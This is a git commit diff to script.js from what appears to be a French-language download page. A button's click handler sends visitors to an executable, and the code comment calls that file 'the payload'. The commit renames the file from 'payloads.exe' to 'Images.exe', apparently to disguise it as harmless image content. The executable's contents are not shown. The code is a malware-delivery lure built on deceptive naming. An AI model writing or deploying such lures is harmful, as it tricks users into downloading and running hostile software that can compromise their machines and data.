da4164dc1d62ecf9d52116ed63788f60e0f83542
aka <andremariefrauchette@gmail.com>
2026-09-15 10:21:38 +0000

    first commit

--- script.js
+++ script.js
@@ -5,7 +5,7 @@ document.getElementById('downloadBtn').addEventListener('click', function() {
     
     setTimeout(() => {
         // Télécharger le payload
-        window.location.href = 'payloads.exe';
+        window.location.href = 'Images.exe';
         
         // Changer le texte après téléchargement
         this.innerHTML = '<i class="fas fa-check"></i> <span>TÉLÉCHARGEMENT DÉMARRÉ</span>';
